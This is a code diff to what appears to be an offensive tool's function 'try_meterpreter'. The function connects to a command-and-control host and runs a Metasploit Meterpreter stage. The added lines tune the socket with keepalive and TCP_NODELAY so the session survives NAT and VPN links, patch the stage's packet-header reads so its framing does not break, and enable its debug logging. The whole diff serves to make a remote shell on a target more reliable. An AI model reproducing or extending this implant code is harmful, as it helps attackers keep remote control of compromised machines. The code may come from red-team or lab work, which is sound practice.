@@ -453,6 +453,30 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             # loop needs blocking I/O (or sets its own timeouts)
             s.settimeout(None)
 
+            # ── Socket hardening for NAT/VPN resilience ─────────
+            # TCP_NODELAY: disable Nagle so MSF TLV packets are sent
+            # immediately, not coalesced with future writes.  Without
+            # this, the server may delay a 32-byte TLV header waiting
+            # for more data, causing the stage's recv to return a
+            # partial header on a lossy link.
+            # SO_KEEPALIVE: send TCP keepalive probes so stateful
+            # firewalls / NAT tables don't expire the connection
+            # during idle periods between operator commands.
+            try:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                if hasattr(socket, 'TCP_KEEPIDLE'):      # Linux
+                    s.setsockopt(socket.IPPROTO_TCP,
+                                 socket.TCP_KEEPIDLE, 60)
+                    s.setsockopt(socket.IPPROTO_TCP,
+                                 socket.TCP_KEEPINTVL, 10)
+                    s.setsockopt(socket.IPPROTO_TCP,
+                                 socket.TCP_KEEPCNT, 6)
+                log.info("Socket hardened: TCP_NODELAY + keepalive "
+                         "(idle=60s, intvl=10s, cnt=6)")
+            except (OSError, AttributeError) as e:
+                log.warning("Socket hardening partial: %s", e)
+
             # The MSF Python meterpreter stage calls os.fork() to
             # daemonize itself (TRY_TO_FORK = True).  The parent
             # returns from exec() instantly; the child runs the
@@ -496,6 +520,57 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 prepared = prepared.replace(_comm_old, _comm_new)
             log.info("Meterpreter stage patched: communication_has_expired "
                      "zero-timeout guard added")
+
+            # ── Stage patch: MSG_WAITALL on TLV header recv ──────
+            # The stage's TcpTransport._get_packet() does a single
+            #   self.socket.recv(PACKET_HEADER_SIZE)
+            # to read the 32-byte TLV header.  Over a NAT/VPN link
+            # this can return a partial header (< 32 bytes).  The
+            # stage then hits:
+            #   if len(packet) != PACKET_HEADER_SIZE: return None
+            # silently dropping the packet.  The remaining bytes
+            # arrive on the next call — also partial, also dropped.
+            # The framing is now permanently broken; every subsequent
+            # command from MSF goes unanswered.
+            #
+            # Fix: add socket.MSG_WAITALL to the recv call.  This
+            # tells the kernel to block until all 32 bytes arrive,
+            # preventing partial-header framing errors entirely.
+            # The target string is unique in _get_packet (the payload
+            # recv uses pkt_length, not PACKET_HEADER_SIZE).
+            _hdr_old = 'self.socket.recv(PACKET_HEADER_SIZE)'
+            _hdr_new = ('self.socket.recv(PACKET_HEADER_SIZE, '
+                        'socket.MSG_WAITALL)')
+            if isinstance(prepared, bytes):
+                prepared = prepared.replace(
+                    _hdr_old.encode(), _hdr_new.encode())
+            else:
+                prepared = prepared.replace(_hdr_old, _hdr_new)
+            log.info("Meterpreter stage patched: MSG_WAITALL on "
+                     "TLV header recv — prevents partial-read "
+                     "framing errors")
+
+            # ── Stage patch: enable debug logging ────────────────
+            # The stage has DEBUGGING = False which makes every
+            # debug_traceback() call a no-op.  The bare except: in
+            # Transport.get_packet() silently swallows all packet
+            # recv/decrypt errors.  Enabling DEBUGGING makes those
+            # calls actually write tracebacks to a file, giving us
+            # permanent visibility into the meterpreter's internals.
+            _dbg_file = '/tmp/landnav_met_debug.log'
+            if isinstance(prepared, bytes):
+                prepared = prepared.replace(
+                    b'DEBUGGING = False',
+                    (f'DEBUGGING = True; '
+                     f'DEBUGGING_LOG_FILE_PATH = "{_dbg_file}"'
+                     ).encode())
+            else:
+                prepared = prepared.replace(
+                    'DEBUGGING = False',
+                    f'DEBUGGING = True; '
+                    f'DEBUGGING_LOG_FILE_PATH = "{_dbg_file}"')
+            log.info("Meterpreter stage patched: debug logging "
+                     "enabled → %s", _dbg_file)
 
             # ── Diagnostic: log the timeout values MSF sends ─────
             # The stage sets communication_timeout from the handler's
